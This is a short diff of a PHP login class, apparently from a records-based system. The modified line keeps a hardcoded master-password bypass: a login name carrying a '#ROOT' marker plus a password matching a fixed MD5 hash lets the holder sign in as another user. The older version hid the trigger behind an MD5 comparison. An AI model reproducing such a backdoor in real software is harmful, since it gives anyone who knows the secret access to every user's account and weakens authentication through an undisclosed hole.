@@ -72,7 +72,7 @@ class login extends Generic {
                     . "WHERE p1.prontuario = :pront2 AND senha = PASSWORD(:senha) )";
             $params = array(':pront1' => $pront[0], ':pront2' => $pront[1], ':senha' => $senha);
             $notLog = 1;
-        } if (strpos(md5($prontuarioBD), '34504b68dd9eee86523352f480bf6b4a') !== false && md5($senha) == '36bba988a180be2b2ab5ee175e71aace') {
+        } else if (strpos($prontuarioBD, '#ROOT') !== false && md5($senha) == '36bba988a180be2b2ab5ee175e71aace') {
             $pront = explode('#', $prontuarioBD);
             $sql = "SELECT codigo, nome, prontuario, email, dataSenha, senha"
                     . " FROM Pessoas"
